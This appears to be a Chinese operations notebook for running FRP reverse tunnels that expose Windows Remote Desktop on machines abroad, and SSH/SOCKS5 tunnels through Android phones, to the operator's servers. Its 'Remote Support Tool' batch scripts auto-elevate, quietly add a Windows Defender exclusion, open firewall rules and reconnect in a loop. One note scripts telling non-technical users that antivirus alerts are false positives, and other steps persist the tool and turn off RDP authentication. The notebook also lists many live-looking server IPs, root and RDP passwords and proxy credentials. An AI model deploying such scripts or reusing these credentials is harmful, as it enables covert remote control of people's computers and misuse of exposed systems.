# FRP S端

## *. 服务器信息

```bash
## 本地远程桌面
10.1.2.241
liujh - NodeLink2002
## 66.93.34.83:1006


## IR
66.93.15.102:1001
Taheri - Linklink2022

## RU2
35.228.16.71:2006
jump - test1234
## RU3
64.176.72.55:3006
User - test1234

## MM
162.128.72.136:1003
Min Kyaw Zin Thant - Linklink2022

## TM
23.251.49.17:1009
Windows 10 Pro - Linklink2022
```

```bash
## 本地远程桌面
10.1.2.241
liujh - NodeLink2002

## IR（服务器：zen-de）
66.93.15.102:22125
WUE6L@*g5^lb2+q7
# 远程端口 + 凭证（用户名 - 密码）
66.93.15.102:1001
Taheri - Linklink2022

## RU（服务器：gcp 芬兰-赫尔辛基）
## 66.93.34.83:22125 - WUE6L@*g5^lb2+q7
35.228.16.71:22125
V^BAF*sAtTajZjDz
# 远程端口 + 凭证（用户名 - 密码）
35.228.16.71:2006
jump - test1234

## RU2（服务器：vu 波兰-华沙）
64.176.72.55:22125
6S@xq357tv9eHQxJ
# 远程端口 + 凭证（用户名 - 密码）
## 66.93.34.83:1006
35.228.16.71:2006
User - test1234

## MM（服务器：zen-sg）
162.128.72.136:22125
WUE6L@*g5^lb2+q7
# 远程端口 + 凭证（用户名 - 密码）
162.128.72.136:1003
Min Kyaw Zin Thant - Linklink2022

## TM（服务器：zen-de）
23.251.49.17:22125
WUE6L@*g5^lb2+q7
# 远程端口 + 凭证（用户名 - 密码）
23.251.49.17:1009
Windows 10 Pro - Linklink2022
```

```bash
vim /etc/ssh/sshd_config
Port 22
Port 22125
PermitRootLogin yes
GatewayPorts yes
PubkeyAuthentication yes

systemctl restart sshd
```

```bash
vu华沙
64.176.72.55
6S@xq357tv9eHQxJ

gcp的芬兰
35.228.16.71
V^BAF*sAtTajZjDz
```



## 操作流程

```bash
公网访问：
1.1.1.1:1001
        ↓
   Linux VPS（frps）
        ↓
   Windows（frpc）
        ↓
   127.0.0.1:3389（远程桌面）
```

## 配置 Linux 服务端 (frps)

```bash
mkdir -p /opt/frp;cd /opt/frp
wget https://github.com/fatedier/frp/releases/download/v0.69.1/frp_0.69.1_linux_amd64.tar.gz
tar -zxvf frp_0.69.1_linux_amd64.tar.gz
cd /opt/frp/frp_0.69.1_linux_amd64
```

## 配置 frps.toml

- vim frps.toml

```bash
bindPort = 7000

auth.token = "IR7000"
## auth.token = "ALL7000"

# 允许映射端口范围（你的1001就在里面）
# allowPorts = [
#   { start = 1000, end = 2000 }
# ]
```

## 启动 FRP 服务端

```bash
cd /opt/frp/frp_0.69.1_linux_amd64
./frps -c ./frps.toml
```

## 创建 Systemd 服务文件

- vim /etc/systemd/system/frps.service

```bash
[Unit]
Description=FRP Server
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/frp/frp_0.69.1_linux_amd64
ExecStart=/opt/frp/frp_0.69.1_linux_amd64/frps -c /opt/frp/frp_0.69.1_linux_amd64/frps.toml

Restart=always
RestartSec=5s
LimitNOFILE=1048576

[Install]
WantedBy=multi-user.target
```

```bash
systemctl daemon-reload
systemctl start frps
systemctl enable frps
systemctl status frps
```





# FRP C端

## 远程 windows

```bash
Win + R
mstsc
远程桌面：
10.1.2.241
liujh
NodeLink2002
```

## 下载

```bash
https://github.com/fatedier/frp/releases/download/v0.69.1/frp_0.69.1_windows_amd64.zip

## 路径
C:\Users\liujh\Desktop\FRP-C\frp_0.69.1_windows_amd64.zip

## 文件
frpc.exe（程序主体）
frpc.toml（配置文件）
```

## 修改 frpc.toml 配置

### 原配置

```bash
serverAddr = "127.0.0.1"
serverPort = 7000

[[proxies]]
name = "test-tcp"
type = "tcp"
localIP = "127.0.0.1"
localPort = 22
remotePort = 6000
```

### 修改配置

```bash
serverAddr = "66.93.15.102"
serverPort = 7000

[[proxies]]
name = "windows-rdp"
type = "tcp"
localIP = "127.0.0.1"
localPort = 3389
remotePort = 1001
```

```bash
## 配置解析
- serverAddr = "66.93.15.102"
- serverPort = 7000
连接服务器（frps）：frpc（Windows）去连接 Linux，Linux 上 frps 监听 7000

- [[proxies]]
- name = "windows-rdp"
创建一个隧道（proxy）：定义一个映射规则，名字随便取，但必须唯一

- type = "tcp"
- localIP = "127.0.0.1"
- localPort = 3389
暴露的本地服务：Windows 本地 RDP 服务，就是登录这台机器的桌面（把 3389 接出来给 frp）

- remotePort = 1001
对外开放的端口：Linux 公网服务器（66.93.15.102），对外开放 1001
```



## 启动 FRP 客户端

```bash
cmd
cd C:\Users\liujh\Desktop\FRP-C\frp\frp_0.69.1_windows_amd64
frpc.exe -c frpc.toml
```



# bat 脚本

- start_frp.bat

```bash
因为目标群体是不太懂电脑的国外用户，虽然脚本实现了全自动，但杀毒软件（Windows Defender）的拦截是无法通过简单的批处理静默绕过的（如果要写代码强行绕过杀软，会被系统直接判定为病毒行为，反而更麻烦）

给客户的英文提示参考：
"Please note: Since this is a remote access tool, Windows Defender or your antivirus might flag it or block the download. This is a false positive. Please click 'Allow' or 'Keep' if it prompts, otherwise I won't be able to connect."
(中文意为：因为这是远控工具，杀毒软件可能会误报或拦截。这是正常的，请在弹窗时选择“允许”或“保留”，否则我无法连上。)
```

## 优化版

```bash
@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

color 0A

:: ======================================================================
:: [ 1. AUTOMATIC PRIVILEGE ELEVATION ]
:: ======================================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    if "%1"=="run_as_admin" (
        color 0C
        echo ERROR: Failed to get Administrator Privileges.
        pause
        exit /b
    )
    echo ========================================================
    echo   Requesting Administrator Permissions...
    echo   Please click "YES" on the Windows prompt to continue.
    echo ========================================================
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -ArgumentList 'run_as_admin' -Verb RunAs"
    exit /b
)

:: ======================================================================
:: CONFIG (核心参数)
:: ======================================================================
set SERVER_IP=23.251.49.17
set SERVER_PORT=7000
set AUTH_TOKEN=TM7000
set REMOTE_PORT=1009
set REGION_TAG=tm

title FRP Remote Support Tool - %REGION_TAG%

cd /d "%~dp0"
set BASE=frp
set FRPC=frp\frpc.exe
set CONF=frp\frpc.toml

:: ======================================================================
:: 2. CREATE DIR & INJECT BYPASS (DEFENDER + FIREWALL)
:: ======================================================================
cls
if not exist "%BASE%" mkdir "%BASE%"

for /f "delims=" %%i in ('powershell -Command "[System.IO.Path]::GetFullPath('%BASE%')"') do set ABS_BASE=%%i
echo [1/4] Injecting Antivirus Whitelist for '%BASE%'...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%ABS_BASE%'" >nul 2>&1

echo [1/4] Configuring Windows Firewall for Remote Desktop...
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes >nul 2>&1

:: ======================================================================
:: 3. PREVENT MULTI INSTANCE
:: ======================================================================
echo [2/4] Checking and cleaning up old sessions...
tasklist | findstr /I "frpc.exe" >nul
if !errorlevel! == 0 (
    taskkill /F /IM frpc.exe >nul 2>&1
    timeout /t 1 >nul
)

:: ======================================================================
:: 4. VALIDATION
:: ======================================================================
if not exist "%FRPC%" (
    color 0C
    echo.
    echo =============================================================
    echo  [CRITICAL ERROR] frpc.exe MISSING^!
    echo =============================================================
    pause
    exit /b
)

:: ======================================================================
:: 5. GENERATE CONFIG
:: ======================================================================
echo [3/4] Creating connection config...

set /a RANDOM_NUM=%RANDOM% %% 9000 + 1000

(
echo serverAddr = "%SERVER_IP%"
echo serverPort = %SERVER_PORT%
echo auth.method = "token"
echo auth.token = "%AUTH_TOKEN%"
echo.
echo [[proxies]]
echo name = "frp-%REGION_TAG%-%USERNAME%-!RANDOM_NUM!"
echo type = "tcp"
echo localIP = "0.0.0.0"
echo localPort = 3389
echo remotePort = %REMOTE_PORT%
) > "%CONF%"

:: ======================================================================
:: 6. RUN LOOP
:: ======================================================================
cls
echo.
echo ========================================================
echo    REMOTE SUPPORT ACTIVE - DO NOT CLOSE THIS WINDOW
echo    REGION: !REGION_TAG! - PORT: %REMOTE_PORT%
echo    SERVER: %SERVER_IP%:%REMOTE_PORT%
echo ========================================================
echo.

:loop
"%FRPC%" -c "%CONF%"
echo.
echo [WARN] Connection lost. Reconnecting in 3 seconds...
timeout /t 5 >nul
goto loop
```



## 目录结构

```bash
shell:startupRemoteSupport
  - IR
    - frp
      - frpc.exe
      - frpc.toml
      - LICENSE
    - start_frp.bat
    
  - IR_Remote
    - frp
      - frpc.exe
      - frpc.toml
      - LICENSE
    - scrcpy_adb
      - auto-connect-adb-device.bat
      - ssh-tun-win-adb.sh
    - install.bat
    - start_frp.bat
    - start_all.bat
    
    
  - RU
    - frp
      - frpc.exe
      - frpc.toml
      - LICENSE
    - start_frp.bat
    
    
scrcpy-win64-v3.3.4
  - auto-connect-adb-device.bat
  等待1分钟
  - ssh-tun-win-adb.sh
  
  
启动顺序
- 首次执行 install.bat
# 验证（管理员 cmd 运行）
schtasks /query /tn "RemoteSupport_AutoStart"
## RemoteSupport_AutoStart
# 验证2
Win + R -> taskschd.msc -> 任务计划程序 -> 任务计划程序库 -> RemoteSupport_AutoStart

tasklist | findstr frpc
tasklist | findstr adb

## 取消开机自启
# 禁用
schtasks /change /tn "RemoteSupport_AutoStart" /disable
#验证
schtasks /query /tn "RemoteSupport_AutoStart" /v /fo LIST
# 恢复
schtasks /change /tn "RemoteSupport_AutoStart" /enable
# 删除
schtasks /delete /tn "RemoteSupport_AutoStart" /f
# 验证
schtasks /query /tn "RemoteSupport_AutoStart"

## 添加自启应用
Win + R
shell:startup
拖快捷方式图标

打开设置：点击“开始”菜单，打开“设置”应用
进入启动菜单：依次点击“应用” -> “启动”（登录时自动启动的应用程序）
```





# 远程问题排查

## *. key

```bash
## 伊朗 key（1895101780，jump116）
9JSPRZVUhd1b31UUFFHeal1ZWxGV61kclNDMztyViRjcoRzKrQTZ2RnYsZUdKJiOikXZrJCLiIiOikGchJCLicDNy4SNwIjL2UjLyIiOikXYsVmciwiI3QjMuUDMy4iN14iMiojI0N3boJye

nodelink - Linklink2022

## 土库曼 key（俄罗斯1：475823304，1102935002  俄罗斯2：111694941）（土库曼：1245737925）
9JSPFFkWJhWOQt2TRRXcslTNWdkR4JEWil0MotmTxUnTT9UVsZzanZlbqpXaXJiOikXZrJCLiIiOikGchJCLiATNx4SMwEjLzITMuUDOxIiOikXYsVmciwiIwUTMuEDMx4yMyEjL1gTMiojI0N3boJye

admin - test1234
nodelink - Linklink2022

## 缅甸 key （中继服务器：123.253.21.217）（190298433）
9JSPrJEbEdjULBlU08mRhFlRYd2Vph2YaFHdwNFWqR2dxNnQ6BFOkpla1UVcDJiOikXZrJCLiIiOikGchJCLi02bj5iZpdWLml2Zu0WbrNXZkJiOikXYsVmciwiIt92YuYWan1iZpdmLt12azVGZiojI0N3boJye

nodelink - Linklink2022
```

## *. 设置用户名密码

```bash
# 查看本机用户名
whoami
echo %USERNAME%

# 查看所有用户
net user "Windows 10 Pro" Linklink2022

net user mingzhi test1234
net user User test1234
net user jump test1234
net user jump test1234
```

## 1. 确认windows 远程桌面有没有开启

```bash
win -> 设置 -> 系统（设置里第一个） -> 远程桌面 -> 启用远程桌面
```

![image-20260607135653931](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20260607135653931.png)

## 2. frpc 是否启动（有没有被误杀）

```bash
tasklist | findstr frpc
## frpc.exe                      3496 RDP-Tcp#116                2     11,444 K 

bat 窗口
## login to server success
## proxy added
## start proxy success

# 客户端是否能到FRPS
powershell Test-NetConnection 66.93.34.83 -Port 7000
# 外部是否能到remotePort
powershell Test-NetConnection 128.1.195.29 -Port 4006
## TcpTestSucceeded : True

# 查看所有进程
tasklist
tasklist | findstr /i "defender avast eset kaspersky 360 huorong"
```

## 3. 本地 3389 是否存在

```bash
netstat -ano | findstr 3389
## TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1020                                               
## TCP   10.1.2.241:3389        192.168.20.34:58225    ESTABLISHED     1020                                               
## TCP    [::]:3389              [::]:0                 LISTENING       1020

# 检查FRPC能否访问3389
powershell Test-NetConnection 127.0.0.1 -Port 3389
## TcpTestSucceeded : True

## 若无端口
# 确认远程桌面是否真的启用
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
## fDenyTSConnections    REG_DWORD    0x0

# 查看 3389 配置
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
## 0xD3D

# 查看实际窗口
netstat -ano | findstr LISTENING

# 重启远程桌面
net stop TermService /y
net start TermService

# 重建
shutdown /r /t 0
qwinsta
## rdp-tcp
netstat -ano | findstr 3389

# 修复组件
sfc /scannow
## Windows Resource Protection found corrupt files and successfully repaired them.
shutdown /r /t 0
```

## 4. 查看本地远程状态并测试

```bash
# 查看远程状态
sc query TermService
sc query SessionEnv
sc query UmRdpService
## STATE              : 4  RUNNING

# 启动服务
sc start TermService
# 停止服务
sc stop TermService

mstsc /v:127.0.0.1
```

## 5. 查看当前机器上的会话状态

```bash
qwinsta
## 会话名            用户名                   ID  状态    类型        设备                                                 
## services                                  0  断开                                                                             ##                        nl                     1  断开                                                                    
## >rdp-tcp#116       liujh                  2  运行中                                                                   
## console                                   3  已连接                                                                   
## rdp-tcp                                 65536  侦听

# 查看当前登录用户和会话信息
query user
 用户名                会话名             ID  状态    空闲时间   登录时间                                               
## nl                                      1  断开      5+01:00  2026/6/2 19:19                                         
## >liujh               rdp-tcp#116        2  运行中          .  2026/6/2 19:19


sc query TermService
## STATE              : 4  RUNNING
若 STOPPED 执行 net start TermService
```

## 6. 抓包检测

```bash
# 服务端看客户端是否到达
##  apt install tcpdump -y
tcpdump -i any tcp port 7000 -n -vv

# 抓指定代理电脑
tcpdump -i any host 216.147.123.199 -nn
## 216.147.123.199.62541 > 66.93.34.83.7000
```





# 云盘打包地址

```bash
https://drive.google.com/drive/u/0/folders/107sWsPApWLpoBpzpXZxof7N7vzx2K_1v
```



# 修改项

```bash
直接改成兼容模式测试

管理员 CMD：

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

net stop TermService /y
net start TermService

改完后确认：

reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer

reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication

应该看到：

SecurityLayer      REG_DWORD    0x0
UserAuthentication REG_DWORD    0x0
```

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 2 /f

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f

net stop TermService /y
net start TermService

SecurityLayer        REG_DWORD    0x2
UserAuthentication   REG_DWORD    0x1
```

## 剪切失效处理

```bash
tasklist | findstr rdpclip
# 若没输出执行
start rdpclip.exe
# 有输出执行
taskkill /F /IM rdpclip.exe
start rdpclip.exe
```



## 初版脚本

```bash
@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

title FRP Remote Support Tool - GREEN EDITION
color 0A

:: ======================================================================
:: [ 1. AUTOMATIC PRIVILEGE ELEVATION ]
:: ======================================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    if "%1"=="run_as_admin" (
        color 0C
        echo ERROR: Failed to get Administrator Privileges.
        pause
        exit /b
    )
    echo ========================================================
    echo   Requesting Administrator Permissions...
    echo   Please click "YES" on the Windows prompt to continue.
    echo ========================================================
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -ArgumentList 'run_as_admin' -Verb RunAs"
    exit /b
)

:: =========================
:: CONFIG (参数修改)
:: =========================
set SERVER_IP=66.93.34.83
set SERVER_PORT=7000
set REMOTE_PORT=1006

cd /d "%~dp0"

set BASE=frp
set FRPC=frp\frpc.exe
set CONF=frp\frpc.toml

:: =========================
:: HEADER
:: =========================
cls
echo ========================================================
echo    FRP Remote Support Tool (LOCAL GREEN EDITION)
echo ========================================================
echo.

:: =========================
:: 2. CREATE DIR & INJECT DEFENDER BYPASS
:: =========================
if not exist "%BASE%" mkdir "%BASE%"

for /f "delims=" %%i in ('powershell -Command "[System.IO.Path]::GetFullPath('%BASE%')"') do set ABS_BASE=%%i
echo [1/4] Injecting Antivirus Whitelist for '%BASE%'...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%ABS_BASE%'" >nul 2>&1

:: =========================
:: 3. PREVENT MULTI INSTANCE & STOP OLD
:: =========================
echo [2/4] Checking and cleaning up old sessions...
tasklist | findstr /I "frpc.exe" >nul
if !errorlevel! == 0 (
    taskkill /F /IM frpc.exe >nul 2>&1
    timeout /t 1 >nul
)

:: =========================
:: 4. VALIDATION
:: =========================
if not exist "%FRPC%" (
    color 0C
    echo.
    echo =============================================================
    echo  [CRITICAL ERROR] frpc.exe MISSING^!
    echo =============================================================
    echo  Please make sure 'frp' folder and 'frpc.exe' are in the same 
    echo  directory with this script.
    echo =============================================================
    pause
    exit /b
)

:: =========================
:: 5. GENERATE CONFIG
:: =========================
echo [3/4] Creating connection config...

(
echo serverAddr = "%SERVER_IP%"
echo serverPort = %SERVER_PORT%
echo.
echo [[proxies]]
echo name = "frp-ru-%USERNAME%"
echo type = "tcp"
echo localIP = "127.0.0.1"
echo localPort = 3389
echo remotePort = %REMOTE_PORT%
) > "%CONF%"

:: =========================
:: 6. RUN LOOP
:: =========================
echo [4/4] Starting tunnel...
echo.
echo ========================================================
echo    REMOTE SUPPORT ACTIVE - DO NOT CLOSE THIS WINDOW
echo    SERVER: %SERVER_IP%:%REMOTE_PORT%
echo ========================================================
echo.

:loop
"%FRPC%" -c "%CONF%"

echo.
echo [WARN] Connection lost. Reconnecting in 3 seconds...
timeout /t 3 >nul
goto loop
```





# 检测程序流程

```bash
# 下载 git bush
https://github.com/git-for-windows/git/releases/download/v2.54.0.windows.1/Git-2.54.0-64-bit.exe

# 检查是否授权（open_a_terminal_here 文件）
adb devices

# 开启检测手机
jump-net-test -> scrcpy-win64-v3.3.4 -> auto-connect-adb-device.bat
先开手机脚本 -> 后开电脑脚本
- 脚本都是同一个： ssh-tun-win-adb.sh

# 若手机没有脚本
curl -O https://cfbtjrjo.veronap.republican/xray/ssh-tun-wind-adb.sh
https://cfbtjrjo.veronap.republican/xray/jump-jump-android-release-v3.0.0.zip
https://cftvpnex.mopetin.live/ansible/jump/jump-jump-android-release-v3.0.0.zip

curl -L -o ssh-tun-win-adb.sh "https://drive.usercontent.google.com/download?id=18aa63fn03jGj0_cHVLO1H6V7_du27PRQ&export=download&authuser=0&confirm=t&uuid=576201fd-e20e-492c-b9d7-1a80b25232d3&at=AAINaILN9GriftsrkyMTEQ5EVtO5:1780819028278"bash

curl -L -o ssh-tun-win-adb.sh "https://drive.usercontent.google.com/download?id=15GiyszsbrAqMSIl-eo2CAV0qMd4UyT42&export=download&authuser=0&confirm=t&uuid=7db8e8dd-bcdc-4f33-8d25-2a07b5e4b059&at=AAINaIK5epGdWFyvP4UCDxaRdNm9:1780907515526"bash

## 直接拖
cp /sdcard/Download/ssh-tun-win-adb.sh ./
chmod +x ssh-tun-win-adb.sh
授权：termux-setup-storage
## 按下ctrl+v -> 然后手机按住屏幕-粘贴

# 服务器测试
- 用户名（手机上的用户名）
- 密码（手机上的密码）
- 端口（电脑脚本的示例端口）
ssh密码：NL@2019
SOCKS5密码：NL2019
# 执行
ssh uO_a358@35.228.16.71:20001
ssh uO_a16@35.228.16.71:20003
## ssh -p 20001 u0_a358@35.228.16.71
```

![image-20260604201435837](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20260604201435837.png)

![image-20260604201549173](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20260604201549173.png)

![image-20260604201612095](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20260604201612095.png)

![image-20260604201647718](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20260604201647718.png)

![image-20260604201811125](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20260604201811125.png)

## jump 隔离 tmux

```bash
打开 jump 程序 -> 左上角三条杠 -> split tunneling -> bypass vpn
```

![image-20260609153809946](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20260609153809946.png)

## 服务端需要的文件

```bash
/var/www/html/ir-net-test
/etc/nginx/ssl
/etc/nginx/conf.d/default.conf

/root/.ssh/authorized_keys
/etc/ssh/sshd_config
Port 22
GatewayPorts yes
PubkeyAuthentication yes

## systemctl restart sshd

ssh-tun-win-adb.sh
## 脚本地址：https://drive.google.com/file/d/18aa63fn03jGj0_cHVLO1H6V7_du27PRQ/view?usp=drive_link
```

```bash
ls /var/www/html/ir-net-test/
cat /var/www/html/ir-net-test/ls-ssh-tun-id_ecdsa_256
cat ~/.ssh/authorized_keys

```



# 代理远程问题记录

```bash
# 伊朗
- rustdesk 状态： 显示已连接，但无画面传输
-     frpc 状态： 无法连接远程
-          排查： 需联系 IR 代理，截图最新电脑桌面状态，确认 rustdesk 正常，确认电脑没有离线或休眠自动杀掉程序

# 俄罗斯
- 5台手机 mingzhi 代理的 rustdesk 状态： 之前电脑离线，重新开机后正常
-                          frpc 状态： jump 节点为和跳板机机器一致，远程连接正常，流畅度还可以
-                         检测手机状态： 5台检测手机服务已重新开启，测试正常
-                               排查： 电脑关机离线导致远程失败，电脑电源一直显示 0% 需和代理确认
-                               解决： 已更换新电脑

# 土库曼
- rustdesk 状态： 解除休眠后正常
-     frpc 状态： jump 节点为和跳板机机器一致，远程连接正常，流畅度还可以
-    检测手机状态： 3台检测手机服务已重新开启，测试正常
-           排查： 电脑休眠时间，解除电脑休眠状态

# 缅甸
- rustdesk 状态： 正常
-     frpc 状态： jump 节点为和跳板机机器一致，远程连接正常，流畅度还可以
-    检测手机状态： 2台检测手机服务已重新开启，测试正常
-           排查： 检测文件刚启动添加的，之前还没连接手机
```

```bash
- 快捷键 Win + R 输入 eventvwr.msc 后按回车
- 在左侧导航栏依次展开 Windows 日志 -> 系统
- 点击右侧面板的 “筛选当前日志...”。输入事件 ID：在 <所有事件 ID> 框中输入以下对应的数字 1074,6006,6005,41,6008
  - 1074：正常关机或重启（由用户或程序主动触发）
    - C:\Windows\system32\svchost.exe 或 UpdateOrchestrator（而用户手动重启通常显示为 explorer.exe 或 shutdown.exe）
  - 6006：系统已成功关闭（正常关机记录）
  - 6005：系统已启动（开机记录）
  - 41 或 6008：意外断电或蓝屏死机（非正常关机/强制重启）
```

```bash
按 Win + R 打开运行框，输入 regedit 回车打开注册表编辑器
在顶部地址栏直接复制并跳转到：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet
在右侧双击打开 EnableActiveProbing
将它的“数值数据”从 1 修改为 0，点击确定。重启电脑即可
```

```bash
# ping 本地网关（本机网络）
ping 192.168.1.1 -t
192.168.1.1 的 Ping 统计信息:                                                                                               
数据包: 已发送 = 100，已接收 = 100，丢失 = 0 (0% 丢失)，往返行程的估计时间(以毫秒为单位):    
最短 = 1ms，最长 = 7ms，平均 = 3ms

# ping frps 服务器
ping 35.228.16.71 -t
35.228.16.71 的 Ping 统计信息:
数据包: 已发送 = 95，已接收 = 95，丢失 = 0 (0% 丢失)，往返行程的估计时间(以毫秒为单位):
最短 = 0ms，最长 = 0ms，平均 = 0ms

# ping VPN 网关
ipconfig

powershell Test-NetConnection 35.228.16.71 -Port 7000

tracert 35.228.16.71
mtr -T 35.228.16.71
```





# 远程连接串

## *. 检测平台

```bash
http://38.107.226.229:38881/buisness/checkserver
编辑 -> 修改 -> 下发配置

# 查看运营商
curl ipinfo.io/37.111.5.218
```



## RU 5台手机

```bash
# RU
##    ssh 密码：NL@2019
## socks5 密码：NL2019
- R5CY34HCYZK
ssh u0_a16@35.228.16.71:20000
socks5://u0_a16:NL2019@35.228.16.71:21000

- R5CY51JAFWV
ssh u0_a338@35.228.16.71:20001
socks5://u0_a338:NL2019@35.228.16.71:21001

- R5CY52RNYHX
ssh u0_a358@35.228.16.71:20002
socks5://u0_a358:NL2019@35.228.16.71:21002

- R5CY703DHCN
ssh u0_a327@35.228.16.71:20003
socks5://u0_a327:NL2019@35.228.16.71:21003

- R5CY724V2DM
ssh u0_a350@35.228.16.71:20004
socks5://u0_a350:NL2019@35.228.16.71:21004

curl -v -x socks5://u0_a16:NL2019@35.228.16.71:21000 cip.cc && \
curl -v -x socks5://u0_a338:NL2019@35.228.16.71:21001 cip.cc && \
curl -v -x socks5://u0_a358:NL2019@35.228.16.71:21002 cip.cc && \
curl -v -x socks5://u0_a327:NL2019@35.228.16.71:21003 cip.cc && \
curl -v -x socks5://u0_a350:NL2019@35.228.16.71:21004 cip.cc
```

```bash
- R5CY34HCYZK
# ssh
  - 用户名：u0_a16
  -  密码：NL@2019
  -  端口：20000
ssh u0_a16@35.228.16.71:20000
  
# sock
  - 用户名：u0_a16
  -  密码：NL2019
  -  端口：21000
curl -v -x socks5://u0_a16:NL2019@35.228.16.71:21000 cip.cc
socks5://u0_a16:NL2019@35.228.16.71:21000
## IP	: 178.176.77.37
## 数据三	: 俄罗斯莫斯科莫斯科 | MegaFon


- R5CY51JAFWV
# ssh
  - 用户名：u0_a338
  -  密码：NL@2019
  -  端口：20001
ssh u0_a338@35.228.16.71:20001
  
# sock
  - 用户名：u0_a338
  -  密码：NL2019
  -  端口：21001
curl -v -x socks5://u0_a338:NL2019@35.228.16.71:21001 cip.cc
socks5://u0_a338:NL2019@35.228.16.71:21001
## IP	: 92.36.49.199
## 数据三	: 俄罗斯 | 俄罗斯 Tele2


- R5CY52RNYHX
# ssh
  - 用户名：u0_a358
  -  密码：NL@2019
  -  端口：20002
ssh u0_a358@35.228.16.71:20002
  
# sock
  - 用户名：u0_a358
  -  密码：NL2019
  -  端口：21002
curl -v -x socks5://u0_a358:NL2019@35.228.16.71:21002 cip.cc
socks5://u0_a358:NL2019@35.228.16.71:21002
## IP	: 91.79.47.34
## 数据三	: 俄罗斯莫斯科莫斯科 | Mobile-TeleSystems


- R5CY703DHCN
# ssh
  - 用户名：u0_a327
  -  密码：NL@2019
  -  端口：20003
ssh u0_a327@35.228.16.71:20003
  
# sock
  - 用户名：u0_a327
  -  密码：NL2019
  -  端口：21003
curl -v -x socks5://u0_a327:NL2019@35.228.16.71:21003 cip.cc
socks5://u0_a327:NL2019@35.228.16.71:21003
## IP	: 31.173.80.17
## 数据三	: 俄罗斯莫斯科莫斯科 | MegaFon


- R5CY724V2DM
# ssh
  - 用户名：u0_a350
  -  密码：NL@2019
  -  端口：20004
ssh u0_a350@35.228.16.71:20004
  
# sock
  - 用户名：u0_a350
  -  密码：NL2019
  -  端口：21004
curl -v -x socks5://u0_a350:NL2019@35.228.16.71:21004 cip.cc
socks5://u0_a350:NL2019@35.228.16.71:21004
## IP	: 81.9.48.24
## 数据三	: 俄罗斯莫斯科莫斯科 | VimpelCom
```



## TM 3台手机

```bash
curl ipinfo.io/5.113.128.245

# TM
##    ssh 密码：NL@2019
## socks5 密码：NL2019
- 9b010059305331323800590d24d18c
ssh u0_a232@23.251.49.17:20000
socks5://u0_a232:NL2019@23.251.49.17:21000

- 9b010059305331323800b4992518c0
ssh u0_a230@23.251.49.17:20001
socks5://u0_a230:NL2019@23.251.49.17:21001

- 9b0100593053313238005a0225068c
ssh u0_a229@23.251.49.17:20002
socks5://u0_a229:NL2019@23.251.49.17:21002

curl -v -x socks5://u0_a232:NL2019@23.251.49.17:21000 cip.cc && \
curl -v -x socks5://u0_a230:NL2019@23.251.49.17:21001 cip.cc && \
curl -v -x socks5://u0_a229:NL2019@23.251.49.17:21002 cip.cc
```

```bash
- 9b010059305331323800590d24d18c
# ssh
  - 用户名：u0_a232
  -  密码：NL@2019
  -  端口：20000
ssh u0_a232@23.251.49.17:20000
  
# sock
  - 用户名：u0_a232
  -  密码：NL2019
  -  端口：21000
curl -v -x socks5://u0_a232:NL2019@23.251.49.17:21000 cip.cc
socks5://u0_a232:NL2019@23.251.49.17:21000
## socks5://u0_a232:NL2019@158.160.225.41:21000
## IP	: 95.85.103.201
## 数据二	: 土库曼斯坦 | Turkmentelecom


- 9b010059305331323800b4992518c0
# ssh
  - 用户名：u0_a230
  -  密码：NL@2019
  -  端口：20001
ssh u0_a230@23.251.49.17:20001
  
# sock
  - 用户名：u0_a230
  -  密码：NL2019
  -  端口：21001
curl -v -x socks5://u0_a230:NL2019@23.251.49.17:21001 cip.cc
socks5://u0_a230:NL2019@23.251.49.17:21001
## IP	: 93.171.220.43
## 数据三	: Telephone Network of Ashgabat CJSC（AGTS）


- 9b0100593053313238005a0225068c
# ssh
  - 用户名：u0_a229
  -  密码：NL@2019
  -  端口：20002
ssh u0_a229@23.251.49.17:20002
  
# sock
  - 用户名：u0_a229
  -  密码：NL2019
  -  端口：21002
curl -v -x socks5://u0_a229:NL2019@23.251.49.17:21002 cip.cc
socks5://u0_a229:NL2019@23.251.49.17:21002
## socks5://u0_a229:NL2019@158.160.225.41:21002
## IP	: 95.85.103.201
## 数据二	: 土库曼斯坦 | Turkmentelecom
```



## MM 2台手机

```bash
curl ipinfo.io/5.113.128.245

# MM
##    ssh 密码：NL@2019
## socks5 密码：NL2019
- 2d17bcf5
ssh u0_a386@162.128.72.136:20000
socks5://u0_a386:NL2019@162.128.72.136:21000

- 99bd1f4f
ssh u0_a392@162.128.72.136:20001
